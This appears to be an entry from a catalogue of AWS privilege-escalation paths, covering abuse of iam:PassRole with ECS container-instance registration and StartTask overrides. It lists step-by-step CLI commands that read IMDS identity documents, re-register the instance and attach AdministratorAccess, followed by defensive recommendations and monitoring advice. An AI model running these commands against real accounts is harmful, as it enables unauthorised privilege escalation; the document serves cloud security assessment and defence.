id: ecs-007
name: iam:PassRole + ecs:StartTask + ecs:RegisterContainerInstance
category: new-passrole
services:
  - iam
  - ecs
  - ec2

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must cover both the task role ARN (for the taskRoleArn override) and the execution role ARN defined in the existing task definition — ECS requires PassRole on the execution role even when it is not being changed
    - permission: ecs:RegisterContainerInstance
      resourceConstraints: Must be able to register an EC2 instance to an existing ECS cluster via direct API call using IMDS identity documents
    - permission: ecs:StartTask
      resourceConstraints: Must have permission to start tasks on container instances in the target cluster
  additional:
    - permission: ecs:ListClusters
      resourceConstraints: Helpful for finding the target cluster name
    - permission: ecs:ListContainerInstances
      resourceConstraints: Helpful for verifying container instance registration and retrieving instance ARNs
    - permission: ecs:ListTaskDefinitions
      resourceConstraints: Helpful for discovering existing task definitions to exploit
    - permission: ecs:DescribeTasks
      resourceConstraints: Helpful for monitoring task execution status
    - permission: ecs:DeregisterContainerInstance
      resourceConstraints: Helpful for cleaning up the orphaned direct-API registration after the ECS agent creates its own registration; the attack succeeds without it
    - permission: ec2:DescribeSubnets
      resourceConstraints: Helpful for finding subnets if network configuration is needed
    - permission: ec2:DescribeSecurityGroups
      resourceConstraints: Helpful for finding security groups if network configuration is needed

description: An EC2 instance role with `iam:PassRole`, `ecs:RegisterContainerInstance`, and `ecs:StartTask` can be exploited when the attacker has Remote Code Execution (RCE) on the EC2 instance. The attacker retrieves the EC2 instance identity document and signature from IMDS, then calls `ecs:RegisterContainerInstance` directly via the API to register the instance to a target ECS cluster — without going through the ECS agent. Next, the attacker reconfigures the ECS agent to point to the target cluster and restarts it. Once the agent reconnects with full capability attributes, the attacker calls `ecs:StartTask` with `--overrides` to run an existing task definition with a malicious container command and a privileged `taskRoleArn` passed via `iam:PassRole`. This technique requires no `ecs:RegisterTaskDefinition` — the `--overrides` parameter hijacks an existing task definition to execute arbitrary commands with the passed role's permissions.

prerequisites:
  admin:
    - Attacker has Remote Code Execution (RCE) on an EC2 instance whose instance role has the required permissions
    - An ECS cluster must exist in the account
    - An existing task definition must be available in the cluster
    - A role must exist that trusts ecs-tasks.amazonaws.com with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
    - Attacker has Remote Code Execution (RCE) on an EC2 instance whose instance role has the required permissions
    - An ECS cluster must exist in the account
    - An existing task definition must be available in the cluster
    - A role must exist that trusts ecs-tasks.amazonaws.com

exploitationSteps:
  awscli:
    - step: 1
      command: aws sts get-caller-identity
      description: Verify identity on the compromised EC2 instance using the instance role's IMDS credentials
    - step: 2
      command: |
        IDENTITY_DOC=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document)
        IDENTITY_SIG=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature | tr -d '\n')
        TOTAL_CPU=$(($(nproc --all) * 1024))
        TOTAL_MEM=$(grep MemTotal /proc/meminfo | awk '{print int($2/1024)}')
      description: Retrieve the EC2 instance identity document and PKCS7 signature from IMDS — these are used as proof of identity when calling ecs:RegisterContainerInstance
    - step: 3
      command: |
        aws ecs register-container-instance \
          --cluster TARGET_CLUSTER \
          --instance-identity-document "$IDENTITY_DOC" \
          --instance-identity-document-signature "$IDENTITY_SIG" \
          --total-resources "[{\"name\":\"CPU\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_CPU},{\"name\":\"MEMORY\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_MEM}]" \
          --query 'containerInstance.containerInstanceArn' \
          --output text
      description: Register the EC2 instance to the target ECS cluster by calling ecs:RegisterContainerInstance directly via the API using the IMDS identity documents — this bypasses the ECS agent entirely for the initial registration
    - step: 4
      command: |
        sed -i 's/CURRENT_CLUSTER/TARGET_CLUSTER/' /etc/ecs/ecs.config
        echo ECS_ENABLE_TASK_IAM_ROLE=true >> /etc/ecs/ecs.config
        systemctl restart ecs
      description: Reconfigure the ECS agent to connect to the target cluster and enable task IAM role support, then restart the agent so it reconnects with full capability attributes (Docker version, OS type, networking) needed for task placement
    - step: 5
      command: |
        aws ecs list-container-instances \
          --cluster TARGET_CLUSTER \
          --query 'containerInstanceArns' \
          --output json
      description: Wait for the ECS agent to reconnect (agentConnected=true) and retrieve the agent-connected container instance ARN — use ecs:describe-container-instances to confirm the agent is connected before proceeding
    - step: 6
      command: |
        aws ecs list-task-definitions \
          --query 'taskDefinitionArns' \
          --output json
      description: Discover existing task definitions to exploit using the --overrides parameter — ecs:RegisterTaskDefinition is not required
    - step: 7
      command: |
        aws ecs start-task \
          --cluster TARGET_CLUSTER \
          --task-definition EXISTING_TASK_DEFINITION \
          --container-instances CONTAINER_INSTANCE_ARN \
          --overrides '{
            "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
            "containerOverrides": [{
              "name": "CONTAINER_NAME",
              "command": ["iam", "attach-role-policy", "--role-name", "INSTANCE_ROLE_NAME", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
            }]
          }'
      description: Start the existing task definition on the registered container instance, overriding the task role ARN via iam:PassRole and the container command with a payload that escalates the instance role's privileges
    - step: 8
      command: aws ecs describe-tasks --cluster TARGET_CLUSTER --tasks TASK_ARN
      description: Monitor task status until it reaches STOPPED state, then verify privilege escalation was successful

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative task roles** - Very rarely does an ECS task need administrative access. Use the principle of least privilege.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "ecs-tasks.amazonaws.com"
      }
    }
  }
  ```


  - Restrict `ecs:RegisterContainerInstance` on EC2 instance roles — this permission allows self-registration to any cluster and is not needed for workloads that are not ECS container instances
  - Restrict `ecs:StartTask` and `ecs:RegisterContainerInstance` to specific cluster ARNs rather than wildcard resources
  - Monitor CloudTrail for `ecs:RegisterContainerInstance` calls originating from EC2 instance roles, especially to clusters where the instance is not expected to register
  - Monitor CloudTrail for ECS task execution with task role ARN overrides (`taskRoleArn` in the overrides field)
  - Monitor CloudTrail for roles being passed to ECS tasks that haven't been used before
  - Monitor and alert on ECS task execution with privileged roles passed via `--overrides`
  - Regularly audit EC2 instance roles for `ecs:RegisterContainerInstance` and `ecs:StartTask` permissions — these are high-risk when combined with `iam:PassRole`
  - Regularly audit all IAM roles that trust the ECS service and down-scope any roles with administrative access

limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.

  This path requires the attacker to already have Remote Code Execution (RCE) on an EC2 instance with the appropriate instance role permissions — a significant prerequisite compared to paths that only require an IAM user or role. In practice, this scenario arises when an EC2 instance running a vulnerable web application or workload has an overly permissive instance role.

